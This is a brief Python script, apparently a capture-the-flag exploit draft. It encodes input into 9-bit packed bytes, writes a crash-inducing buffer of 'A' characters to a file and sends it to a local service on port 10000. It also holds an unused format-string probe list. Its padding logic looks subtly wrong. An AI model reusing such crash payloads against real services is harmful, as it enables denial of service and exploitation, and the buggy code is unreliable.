import sys
import socket
def encode(s):
  s = ''.join(bin((x))[2:].zfill(9) for x in s)
  s += '0' * (8 % len(s))
  s = [int(s[i:i+8], 2) for i in range(0, len(s), 8)]
  s = bytearray(s)
  return s

def decode(s):
  s = ''.join(bin(ord(x))[2:].zfill(8) for x in s)
  s = [int(s[i:i+9], 2) for i in range(0, len(s), 9)]
  # s = bytearray(s)
  return s

x = [229, 187, 190, 228, 185, 135, 228, 185, 154, 228, 185, 154, 227, 132, 150, 32, 229, 177, 177, 227, 132, 150, 229, 176, 186, 228, 185, 154, 225, 151, 170, 33]

x += [0, 0, 32, 37, 100] + [0] * 100
payload = encode(bytearray('A'*10 + '\n'))
#print payload
f = open('crash', 'wb')
f.write(payload)
f.close()

s = socket.create_connection(('127.0.0.1', 10000))
s.send(payload)
